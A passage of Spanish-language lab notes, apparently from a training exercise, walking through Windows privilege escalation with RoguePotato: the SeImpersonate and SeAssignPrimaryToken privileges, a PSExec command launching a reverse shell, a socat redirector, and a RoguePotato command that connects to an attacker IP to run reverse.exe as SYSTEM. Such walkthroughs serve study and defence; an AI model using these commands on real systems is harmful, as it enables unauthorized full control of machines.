s una herramienta de escalación de privilegios en sistemas Windows. Se utiliza para elevar los privilegios desde una cuenta de servicio a la cuenta del sistema local. Esto se logra explotando vulnerabilidades en el sistema de Windows, específicamente en el proceso de resolución de DCOM (Distributed Component Object Model) por el puerto 135 a través de la característica SeImpersonatePrivilege, que permite a los atacantes impersonar a otros usuarios o cuentas del sistema.
```
https://github.com/antonioCoco/RoguePotato
```

# Configuración previa
Para poder ejecutar la herramienta y obtener todos los privilegios es necesario que tengamos acceso con una cuenta local y los dos permisos marcados en la imagen
![[Pasted image 20240723091518.png]]
- **SeImpersonatePrivilege**: Este permiso permite a un proceso suplantar la identidad de otro proceso. Es fundamental para muchas técnicas de escalada de privilegios, ya que permite que un proceso menos privilegiado actúe como otro con mayores privilegios. En el contexto de esta tarea, es utilizado por `RoguePotato` para obtener el token SYSTEM.
- **SeAssignPrimaryTokenPrivilege**: Este privilegio permite a un proceso reemplazar el token de seguridad de un proceso. Es importante para la creación de procesos con credenciales diferentes a las originales del proceso que los inicia. En la tarea, después de obtener el token SYSTEM, este permiso es utilizado para lanzar `reverse.exe` con los privilegios elevados.

# Ejemplo Rogue Potato
Para poder usar `Rogue Potato` y obtener una shell con privilegios de `NT/AUTHORITY/SYSTEM` es necesario ejecutarlo con una cuenta del sistema local, asi que para ello lo primero es tener acceso, para ello nos generamos la reverse shell
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```
![[Pasted image 20240723080446.png]]
![[Pasted image 20240723090847.png]]

Ahora ejecutamos el siguiente comando de socat para redireccionar el trafico del puerto 135 el cual es por el que tenemos que escuchar para este ataque y lo redirige por el puerto 9999. Esto simula el tráfico DCOM/RPC en el puerto 135 y lo redirige al puerto 9999
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.123.207:9999
```
![[Pasted image 20240723090937.png]]

Y ahora volvemos a ponernos a la escucha con netcat y ejecutando la herramienta de `roguepotato` obtenemos el token de `System` en la otra reverse shell.
Rogue Potato se conecta a la IP 10.9.0.184 (en el puerto que normalmente sería 135, pero debido a `socat`, se redirige al puerto 9999) y utiliza esa conexión para ejecutar `reverse.exe` en el sistema comprometido con privilegios elevados
```
C:\PrivEsc\RoguePotato.exe -r 10.9.0.184 -e "C:\PrivEsc\reverse.exe" -l 9999
```
![[Pasted image 20240723091018.png]]

Y como vemos obtenemos la shell como `nt authority\system`
![[Pasted image 20240724093849.png]]

